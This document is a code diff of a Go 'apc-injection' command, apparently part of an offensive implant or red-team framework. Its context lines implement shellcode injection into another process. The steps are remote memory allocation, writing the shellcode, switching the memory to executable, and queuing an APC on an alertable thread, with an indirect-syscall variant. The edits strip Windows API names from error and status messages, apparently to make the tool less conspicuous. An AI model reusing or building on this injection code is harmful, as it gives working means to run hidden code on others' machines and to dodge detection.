@@ -51,7 +51,7 @@ func (c *ApcInjectionCommand) Name() string {
 
 // Description returns the command description
 func (c *ApcInjectionCommand) Description() string {
-	return "Perform QueueUserAPC injection into an alertable thread"
+	return "Perform APC injection into an alertable thread"
 }
 
 // ApcInjectionParams represents the parameters for apc-injection
@@ -182,7 +182,7 @@ func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 		hProcess, 0, uintptr(len(shellcode)),
 		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE))
 	if remoteAddr == 0 {
-		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", err)
+		return sb.String(), fmt.Errorf("memory allocation failed: %v", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at: 0x%X\n", remoteAddr))
 
@@ -192,7 +192,7 @@ func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 		hProcess, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)))
 	if ret == 0 {
-		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", err)
+		return sb.String(), fmt.Errorf("memory write failed: %v", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten))
 
@@ -202,7 +202,7 @@ func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 		hProcess, remoteAddr, uintptr(len(shellcode)),
 		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
-		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", err)
+		return sb.String(), fmt.Errorf("memory protection change failed: %v", err)
 	}
 	sb.WriteString("[+] Changed memory protection to RX\n")
 
@@ -210,7 +210,7 @@ func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 	hThread, _, err := procOpenThread.Call(
 		uintptr(THREAD_ALL_ACCESS), 0, uintptr(tid))
 	if hThread == 0 {
-		return sb.String(), fmt.Errorf("OpenThread failed: %v", err)
+		return sb.String(), fmt.Errorf("thread open failed: %v", err)
 	}
 	defer procCloseHandle.Call(hThread)
 	sb.WriteString(fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread))
@@ -218,7 +218,7 @@ func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 	// Step 6: Queue APC
 	ret, _, err = procQueueUserAPC.Call(remoteAddr, hThread, 0)
 	if ret == 0 {
-		return sb.String(), fmt.Errorf("QueueUserAPC failed: %v", err)
+		return sb.String(), fmt.Errorf("APC queue failed: %v", err)
 	}
 	sb.WriteString("[+] APC queued successfully\n")
 
@@ -275,17 +275,17 @@ func apcIndirect(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 	var hThread uintptr
 	status = IndirectNtOpenThread(&hThread, THREAD_ALL_ACCESS, uintptr(tid))
 	if status != 0 {
-		return sb.String(), fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("thread open failed: NTSTATUS 0x%X", status)
 	}
 	defer IndirectNtClose(hThread)
-	sb.WriteString(fmt.Sprintf("[+] NtOpenThread: 0x%X\n", hThread))
+	sb.WriteString(fmt.Sprintf("[+] Opened thread: 0x%X\n", hThread))
 
 	// Step 6: NtQueueApcThread
 	status = IndirectNtQueueApcThread(hThread, remoteAddr, 0, 0, 0)
 	if status != 0 {
-		return sb.String(), fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("APC queue failed: NTSTATUS 0x%X", status)
 	}
-	sb.WriteString("[+] NtQueueApcThread: APC queued\n")
+	sb.WriteString("[+] APC queued\n")
 
 	// Step 7: Resume if suspended
 	apcResumeThread(sb, hThread, threadState, true)
@@ -306,14 +306,14 @@ func apcResumeThread(sb *strings.Builder, hThread uintptr, threadState string, i
 		var prevCount uint32
 		status := IndirectNtResumeThread(hThread, &prevCount)
 		if status != 0 {
-			sb.WriteString(fmt.Sprintf("[!] NtResumeThread failed: NTSTATUS 0x%X\n", status))
+			sb.WriteString(fmt.Sprintf("[!] thread resume failed: NTSTATUS 0x%X\n", status))
 			return
 		}
-		sb.WriteString(fmt.Sprintf("[+] NtResumeThread: previous suspend count: %d\n", prevCount))
+		sb.WriteString(fmt.Sprintf("[+] Thread resumed, previous suspend count: %d\n", prevCount))
 	} else {
 		prevCount, _, _ := procResumeThread.Call(hThread)
 		if int32(prevCount) == -1 {
-			sb.WriteString("[!] ResumeThread failed\n")
+			sb.WriteString("[!] thread resume failed\n")
 			return
 		}
 		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
